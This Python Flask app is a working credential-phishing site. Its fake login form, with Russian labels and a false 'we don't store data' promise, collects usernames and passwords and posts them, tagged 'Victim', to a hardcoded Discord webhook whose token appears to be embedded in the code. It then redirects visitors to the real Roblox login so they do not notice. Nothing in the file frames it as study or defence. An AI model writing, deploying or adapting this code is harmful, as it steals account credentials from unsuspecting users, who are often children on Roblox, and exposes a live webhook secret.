from flask import Flask, request, redirect
import requests
import os

app = Flask(__name__)

WEBHOOK_URL = os.environ.get('WEBHOOK_URL', 'https://ptb.discord.com/api/webhooks/1527631838250668112/2aRhOMk0ukMaGct_pXrS-EWLX5gkvMuKFK1HZmX8J3G1QYTFt1YRBZeJtYsCjoSrWfZ2')


@app.route('/')
def index():
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta property="og:image" content="https://cdn.discordapp.com/attachments/123/456/photo.png">
        <title>lox</title>
        <style>
            body { font-family: Arial; background: #1a1a2e; color: white; text-align: center; padding-top: 50px; }
            input { padding: 10px; margin: 5px; width: 250px; }
            button { padding: 10px 30px; background: #00bfff; border: none; color: white; font-weight: bold; }
        </style>
    </head>
    <body>
        <h2>лох</h2>
        <form action="/login" method="POST">
            <input type="text" name="username" placeholder="Логин" required><br>
            <input type="password" name="password" placeholder="Пароль" required><br>
            <button type="submit">Войти</button>
        </form>
        <p style="color:gray;font-size:12px;">Мы не храним данные, честно</p>
    </body>
    </html>
    '''
    return html

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    # Формируем сообщение для Discord
    msg = f"🎯 **Жертва**: {username}\n🔑 **Пароль**: {password}"
    
    # Отправляем в вебхук
    try:
        requests.post(WEBHOOK_URL, json={'content': msg})
    except:
        pass  # если вебхук кривой — просто игнорим
    
    # Редиректим на настоящий Roblox, чтобы жертва не спалилась
    return redirect('https://www.roblox.com/login')

# Проверка здоровья (для UptimeRobot)
@app.route('/health')
def health():
    return 'ok', 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
